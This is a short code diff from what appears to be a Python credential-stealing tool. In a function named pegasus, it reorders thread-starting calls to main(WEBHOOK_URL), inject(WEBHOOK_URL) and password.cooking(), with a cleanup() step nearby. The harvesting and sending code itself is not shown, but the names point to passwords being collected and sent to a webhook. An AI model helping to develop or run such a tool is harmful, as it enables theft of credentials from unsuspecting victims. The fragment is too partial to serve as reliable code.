@@ -53,9 +53,9 @@ def main(webhook_url):
     cleanup()
 
 def pegasus():
-    t1 = password.cooking()
-    t2 = main(WEBHOOK_URL)
-    t3 = inject(WEBHOOK_URL)
+    t1 = main(WEBHOOK_URL)
+    t2 = inject(WEBHOOK_URL)
+    t3 = password.cooking()
 
     t1.start()
     t2.start()
